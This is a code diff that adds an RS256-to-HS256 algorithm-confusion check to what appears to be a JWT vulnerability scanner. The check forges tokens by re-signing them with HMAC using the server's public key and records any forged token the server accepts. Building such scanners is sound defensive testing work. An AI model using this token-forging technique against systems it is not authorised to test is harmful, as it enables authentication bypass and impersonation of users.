@@ -203,6 +203,39 @@ Result test(const Request &req) {
         }
     }
 
+    // 4) RS256->HS256 algorithm confusion: re-sign the token as HS256 using the
+    //    server's PUBLIC KEY bytes as the HMAC secret. A server that verifies
+    //    with the public key regardless of the alg header accepts it.
+    const QString algLow = d.alg.toLower();
+    const bool asymmetric = algLow.startsWith("rs") || algLow.startsWith("es")
+                         || algLow.startsWith("ps");
+    bool algConfusionUntested = false;
+    if (asymmetric && req.publicKeyPem.isEmpty()) {
+        algConfusionUntested = true;
+    } else if (asymmetric) {
+        QJsonObject h = d.header;  h["alg"] = "HS256";
+        QJsonObject p = d.payload; p.insert(QStringLiteral("nlk"), QStringLiteral("1"));
+        // Servers differ in the exact key bytes they verify with; try a few forms.
+        const QStringList keys = { req.publicKeyPem, req.publicKeyPem.trimmed(),
+                                   req.publicKeyPem.trimmed() + "\n" };
+        for (const QString &k : keys) {
+            const QString forged = JwtTool::signHmac(h, p, k.toUtf8());
+            if (!forged.isEmpty() && acceptedStably(forged)) {
+                result.hits.append({ "alg-confusion", "jwt-alg-confusion",
+                    "the server accepted an HS256 token re-signed with its own public-key "
+                    "bytes -- RS256->HS256 algorithm confusion", forged });
+                result.vulnerable = true;
+                break;
+            }
+        }
+    }
+
+    // Surface the gap when an asymmetric token couldn't be tested for confusion
+    // and nothing else fired (so a clean result isn't mistaken for fully tested).
+    if (algConfusionUntested && !result.vulnerable && result.error.isEmpty())
+        result.error = "asymmetric token: RS256->HS256 algorithm confusion not tested "
+                       "(supply the server public key via publicKey)";
+
     return result;
 }
 
